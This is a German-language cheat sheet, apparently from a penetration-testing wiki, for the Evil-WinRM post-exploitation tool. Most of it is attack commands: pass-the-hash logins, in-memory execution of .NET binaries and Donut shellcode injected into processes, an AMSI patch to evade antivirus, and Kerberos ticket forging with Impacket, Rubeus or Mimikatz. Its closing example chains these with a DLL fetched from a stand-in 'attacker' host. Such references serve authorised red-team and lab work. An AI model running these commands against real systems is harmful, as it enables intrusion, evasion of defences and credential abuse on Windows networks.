---
description: https://github.com/Hackplayers/evil-winrm
---

# evil-winrm

Evil-WinRM ist ein Post-Exploitation-Tool zur Remote-Interaktion mit Windows-Systemen über das WinRM-Protokoll. Es ermöglicht In-Memory-Ausführung, AV-Umgehung, Authentifizierungsoptionen und Dateitransfer.

***

**Features**

* Kompatibel mit Linux- und Windows-Clients
* Ausführung von PowerShell-Skripten, DLLs, C#-Assemblies im Speicher
* Unterstützung für x64-Payloads mit Donut-Technik
* Dynamischer AMSI-Bypass
* Pass-the-Hash und Kerberos-Authentifizierung
* SSL und Zertifikatsunterstützung
* Upload/Download mit Fortschrittsanzeige
* Auflisten von Diensten ohne Adminrechte
* Autovervollständigung lokal und remote
* Farbige Ausgabe (deaktivierbar), optionales Logging
* Docker-Support mit vorgefertigten Images
* Ctrl+C-Schutz gegen unbeabsichtigten Abbruch
* Anpassbarer User-Agent
* ETW (Event Tracing for Windows) Bypass

***

**Grundlegende Nutzung**

```bash
evil-winrm -i <IP> -u <USER> -p <PASS>
evil-winrm -i <IP> -u <USER> -H <HASH>
evil-winrm -i <FQDN> -u <USER> -r <REALM>
```

Weitere Optionen:

```bash
-S           SSL aktivieren  
-c / -k      Zertifikatspfad (Public/Private Key)  
-s           Pfad zu lokalen PowerShell-Skripten  
-e           Pfad zu C#-Executables  
-P           Port (Standard: 5985)  
-l           Logging aktivieren  
-a           Benutzerdefinierter User-Agent  
```

***

**Dateiübertragung**

```bash
upload local_file [remote_file]
download remote_file [local_file]
```

Hinweis: Nur absolute Pfade verwenden. Bei Docker müssen lokale Pfade unter `/data` gemountet sein.

***

**Interaktive Funktionen**

```powershell
menu             # Zeigt verfügbare Tools und Funktionen
services         # Listet Dienste, auch ohne Adminrechte
```

***

**PowerShell-Skripte laden**

```powershell
PowerView.ps1    # Skriptname eingeben (aus Pfad via -s geladen)
menu             # Geladene Funktionen anzeigen
```

***

**Erweiterte Module**

**Invoke-Binary**\
Führt .NET-Executables im Speicher aus:

```powershell
Invoke-Binary path\binary.exe 'arg1,arg2,arg3'
```

**Dll-Loader**\
Lädt DLLs über lokale Pfade, HTTP oder SMB:

```powershell
Dll-Loader -http -path http://<ip>/file.dll
Dll-Loader -local -path C:\Pfad\file.dll
Dll-Loader -smb -path \\<ip>\share\file.dll
```

**Donut-Loader**\
Lädt Donut-basierte Payloads in einen Prozess:

```powershell
Donut-Loader -process_id <PID> -donutfile path\payload.bin
```

Erstellung von Donut-Payloads (außerhalb Evil-WinRM):

```bash
pip3 install donut-shellcode
python3 donut-maker.py -i binary.exe
```

**Bypass-4MSI**\
Patcht AMSI zur AV-Umgehung:

```powershell
Bypass-4MSI
```

***

**Kerberos-Konfiguration**

1. Zeit synchronisieren mit DC:

```bash
rdate -n <dc_ip>
```

2. Ticket erstellen:

* Mit `ticketer.py` (Impacket)
* Mit `Rubeus` oder `Mimikatz` + `ticket_converter.py` (für ccache)

3. Ticket setzen:

```bash
export KRB5CCNAME=/pfad/ticket.ccache
cp ticket.ccache /tmp/krb5cc_0
```

4. `/etc/krb5.conf` konfigurieren:

```conf
CONTOSO.COM = {
    kdc = fooserver.contoso.com
}
```

5. Tickets verwalten:

```bash
klist       # Tickets anzeigen  
kdestroy    # Ticket löschen
```

***

**Beispiel-Nutzung**

```bash
evil-winrm -i 10.10.10.10 -u administrator -H <hash> -s ./ps_scripts -e ./cs_bins
```

Danach in der Evil-WinRM-Shell:

```powershell
Bypass-4MSI
Dll-Loader -http http://attacker/payload.dll
Invoke-Binary ./Rubeus.exe
```
